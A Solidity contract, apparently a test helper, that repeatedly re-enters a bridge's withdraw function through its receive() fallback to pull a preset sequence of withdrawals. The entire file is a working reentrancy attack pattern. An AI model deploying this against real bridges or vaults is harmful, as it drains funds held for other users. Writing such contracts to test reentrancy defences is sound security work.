// SPDX-License-Identifier: Apache-2.0.
pragma solidity ^0.8.20;

interface IBridgeWithdraw {
    function withdraw(address token, uint256 amount, address recipient) external;
}

contract ReentrantWithdrawer {
    address public immutable bridge;
    address public immutable token;

    uint256[] public amounts;
    uint256 public idx;

    constructor(address bridge_, address token_) {
        bridge = bridge_;
        token = token_;
    }

    function setSequence(uint256[] calldata _amounts) external {
        delete amounts;
        for (uint256 i = 0; i < _amounts.length; i++) {
            amounts.push(_amounts[i]);
        }
        idx = 0;
    }

    function attack() external {
        require(amounts.length > 0, "NO_AMOUNTS");
        uint256 a0 = amounts[0];
        idx = 1;
        IBridgeWithdraw(bridge).withdraw(token, a0, address(this));
    }

    receive() external payable {
        if (idx < amounts.length) {
            uint256 a = amounts[idx];
            idx++;
            IBridgeWithdraw(bridge).withdraw(token, a, address(this));
        }
    }
}

